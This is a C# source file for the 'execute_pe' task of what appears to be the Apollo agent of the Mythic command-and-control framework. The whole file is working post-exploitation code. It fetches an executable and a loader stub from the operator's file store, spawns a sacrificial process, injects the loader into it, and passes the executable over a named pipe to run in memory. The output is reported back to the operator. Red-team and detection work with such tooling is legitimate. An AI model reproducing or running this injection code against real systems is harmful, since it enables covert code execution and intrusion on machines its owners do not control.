#define COMMAND_NAME_UPPER

#if DEBUG
#define EXECUTE_PE
#endif

#if EXECUTE_PE

using System;
using System.Text;
using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using System.Runtime.Serialization;
using ApolloInterop.Serializers;
using System.Threading;
using System.Collections.Concurrent;
using System.IO.Pipes;
using ApolloInterop.Structs.ApolloStructs;
using ApolloInterop.Classes.Core;
using ApolloInterop.Utils;
using System.Threading.Tasks;
using ApolloInterop.Classes.Events;
using System.ComponentModel;

namespace Tasks
{
    public class execute_pe : Tasking
    {

#pragma warning disable 0649
        [DataContract]
        internal struct ExecutePEParameters
        {
            [DataMember(Name = "pipe_name")]
            public string PipeName;
            [DataMember(Name = "pe_name")]
            public string PEName;
            [DataMember(Name = "commandline")]
            public string CommandLine;
            [DataMember(Name = "loader_stub_id")]
            public string LoaderStubId;
            [DataMember(Name = "pe_id")]
            public string PeId;
        }
#pragma warning restore 0649

        private AutoResetEvent _senderEvent = new AutoResetEvent(false);
        private ConcurrentQueue<byte[]> _senderQueue = new ConcurrentQueue<byte[]>();
        private JsonSerializer _serializer = new JsonSerializer();
        private ManualResetEvent _procExited = new(false);
        private Task? _sendTask;
        private Task? _flushTask;
        private ConcurrentQueue<string> _outputQueue = new();
        public execute_pe(IAgent agent, MythicTask mythicTask) : base(agent, mythicTask)
        {
            _flushTask = Task.Factory.StartNew(() =>
            {
                while (WaitHandle.WaitAny([_cancellationToken.Token.WaitHandle, _procExited], 1000) == WaitHandle.WaitTimeout)
                {
                    string output = "";
                    while (_outputQueue.TryDequeue(out string data)) { output += data; }
                    if (!string.IsNullOrEmpty(output))
                    {
                        _agent.GetTaskManager().AddTaskResponseToQueue(
                            CreateTaskResponse(
                                output,
                                false
                            ));
                    }
                }

                string finalOutput = "";
                while (_outputQueue.TryDequeue(out string data)) { finalOutput += data; }
                if (!string.IsNullOrEmpty(finalOutput))
                {
                    _agent.GetTaskManager().AddTaskResponseToQueue(
                        CreateTaskResponse(
                            finalOutput,
                            false
                        ));
                }
            });
        }

        public override void Kill()
        {
            _cancellationToken.Cancel();
        }


        public override void Start()
        {
            MythicTaskResponse? resp = null;
            Process? proc = null;
            try
            {
                ExecutePEParameters parameters = _jsonSerializer.Deserialize<ExecutePEParameters>(_data.Parameters);

                DebugHelp.DebugWriteLine("Starting execute_pe task");
                DebugHelp.DebugWriteLine($"Task Parameters: {_data.Parameters}");
                DebugHelp.DebugWriteLine($"Executable name: {parameters.PEName}");
                DebugHelp.DebugWriteLine($"Process command line: {parameters.CommandLine}");

                if (string.IsNullOrEmpty(parameters.LoaderStubId) || string.IsNullOrEmpty(parameters.PEName) || string.IsNullOrEmpty(parameters.PipeName))
                {
                    throw new ArgumentNullException($"One or more required arguments was not provided.");
                }

                byte[]? peBytes;

                if (!string.IsNullOrEmpty(parameters.PeId))
                {
                    if (!_agent.GetFileManager().GetFileFromStore(parameters.PeId, out peBytes))
                    {
                        if (_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.PeId, out peBytes))
                        {
                            _agent.GetFileManager().AddFileToStore(parameters.PeId, peBytes);
                        }
                    }
                }
                else
                {
                    _agent.GetFileManager().GetFileFromStore(parameters.PEName, out peBytes);
                }

                peBytes = peBytes ?? throw new InvalidOperationException($"${parameters.PEName} is not loaded (have you registered it?)");
                if (peBytes.Length == 0)
                {
                    throw new InvalidOperationException($"{parameters.PEName} has a zero length (have you registered it?)");
                }

                if (!_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.LoaderStubId, out byte[] exePEPic))
                {
                    throw new InvalidOperationException($"Failed to download assembly loader stub (with id: {parameters.LoaderStubId}");
                }

                ApplicationStartupInfo info = _agent.GetProcessManager().GetStartupInfo(true);

                proc = _agent.GetProcessManager()
                    .NewProcess(
                        info.Application,
                        info.Arguments,
                        true
                    ) ?? throw new InvalidOperationException($"Process manager failed to create a new process {info.Application}");

                proc.OutputDataReceived += Proc_DataReceived;
                proc.ErrorDataReceieved += Proc_DataReceived;
                proc.Exit += Proc_Exit;

                if (!proc.Start())
                {
                    throw new InvalidOperationException($"Failed to start sacrificial process {info.Application}");
                }

                _agent.GetTaskManager().AddTaskResponseToQueue(
                    CreateTaskResponse("", false, messages:
                        [
                            Artifact.ProcessCreate((int)proc.PID, info.Application, info.Arguments)
                        ]
                    )
                );

                if (!proc.Inject(exePEPic))
                {
                    throw new InvalidOperationException($"Failed to inject assembly loader into sacrificial process.");
                }

                _agent.GetTaskManager().AddTaskResponseToQueue(
                    CreateTaskResponse("", false, messages:
                        [
                            Artifact.ProcessInject((int)proc.PID, _agent.GetInjectionManager().GetCurrentTechnique().Name)
                        ]
                    )
                );

                var cmdargs = new ExecutePEIPCMessage()
                {
                    Executable = peBytes,
                    ImageName = parameters.PEName,
                    CommandLine = parameters.CommandLine,
                };

                var client = new AsyncNamedPipeClient("127.0.0.1", parameters.PipeName);
                client.ConnectionEstablished += Client_ConnectionEstablished;
                client.Disconnect += Client_Disconnet;

                if (!client.Connect(5000))
                {
                    throw new InvalidOperationException($"Failed to connect to named pipe.");
                }

                IPCChunkedData[] chunks = _serializer.SerializeIPCMessage(cmdargs);
                foreach (IPCChunkedData chunk in chunks)
                {
                    _senderQueue.Enqueue(Encoding.UTF8.GetBytes(_serializer.Serialize(chunk)));
                }

                _senderEvent.Set();

                WaitHandle.WaitAny(
                [
                    _cancellationToken.Token.WaitHandle,
                    _procExited,
                ]);
            }
            catch (Exception ex)
            {
                resp = CreateTaskResponse($"{ex.Message}\n\nStack trace: {ex.StackTrace}", true, "error");
                _cancellationToken.Cancel();
            }

            var taskResponse = resp ??= CreateTaskResponse("", true, "completed");

            if (proc is Process procHandle)
            {
                if (!procHandle.HasExited)
                {
                    procHandle.Kill();
                    taskResponse.Artifacts = [Artifact.ProcessKill((int)procHandle.PID)];
                    procHandle.WaitForExit();
                }

                if (procHandle.ExitCode != 0)
                {
                    if ((procHandle.ExitCode & 0xc0000000) != 0
                        && procHandle.GetExitCodeHResult() is int exitCodeHResult)
                    {
                        var errorMessage = new Win32Exception(exitCodeHResult).Message;
                        taskResponse.UserOutput = $"[*] Process exited with code: 0x{(uint)procHandle.ExitCode:x} - {errorMessage}";
                        taskResponse.Status = "error";
                    }
                    else
                    {
                        taskResponse.UserOutput = $"[*] Process exited with code: {procHandle.ExitCode} - 0x{(uint)procHandle.ExitCode:x}";
                    }
                }
            }

            Task.WaitAll([
                _flushTask,
                _sendTask,
            ], 1000);

            _agent.GetTaskManager().AddTaskResponseToQueue(taskResponse);
        }

        private void Client_Disconnet(object sender, NamedPipeMessageArgs e)
        {
            e.Pipe.Close();
        }

        private void Client_ConnectionEstablished(object sender, NamedPipeMessageArgs e)
        {
            _sendTask = Task.Factory.StartNew((state) =>
            {
                PipeStream pipe = (PipeStream)state;

                if (WaitHandle.WaitAny(
                [
                    _cancellationToken.Token.WaitHandle,
                    _procExited,
                    _senderEvent
                ]) == 2)
                {
                    while (pipe.IsConnected && _senderQueue.TryDequeue(out byte[] message))
                    {
                        pipe.BeginWrite(message, 0, message.Length, OnAsyncMessageSent, pipe);
                    }

                    pipe.WaitForPipeDrain();
                }
            }, e.Pipe);
        }

        public void OnAsyncMessageSent(IAsyncResult result)
        {
            PipeStream pipe = (PipeStream)result.AsyncState;
            pipe.EndWrite(result);
            pipe.Flush();
        }

        private void Proc_DataReceived(object sender, StringDataEventArgs args)
        {
            if (!string.IsNullOrEmpty(args.Data))
            {
                _outputQueue.Enqueue(args.Data);
            }
        }

        private void Proc_Exit(object sender, EventArgs e)
        {
            _procExited.Set();
        }
    }
}
#endif
